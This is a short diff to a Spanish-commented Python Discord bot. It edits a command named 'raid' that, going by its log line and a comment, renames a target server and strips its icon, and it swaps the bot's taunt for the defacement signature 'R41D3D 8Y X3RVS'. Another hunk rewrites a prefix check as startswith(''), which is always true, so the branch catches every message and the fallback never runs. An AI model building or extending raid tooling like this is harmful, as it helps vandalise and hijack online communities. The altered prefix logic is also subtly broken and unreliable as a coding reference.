@@ -22,8 +22,8 @@ def get_prefix(bot, message):
     # Solo comandos de economía usan .
     if message.content.startswith('.'):
         return '.'
-    # Comandos especiales usan ∆
-    elif message.content.startswith('∆'):
+    # Comandos especiales usan ∆ NO PONER
+    elif message.content.startswith(''):
         return '∆'
     return ['∆', '.']  # Fallback
 
@@ -342,7 +342,7 @@ async def raid(ctx):
         pass
 
     guild = ctx.guild
-    await ctx.send("Pringados... 😏")
+    await ctx.send("R41D3D 8Y X3RVS")
     print(f"Raid iniciado en el servidor {guild.name}")
 
     # Cambiar nombre del servidor y quitar icono
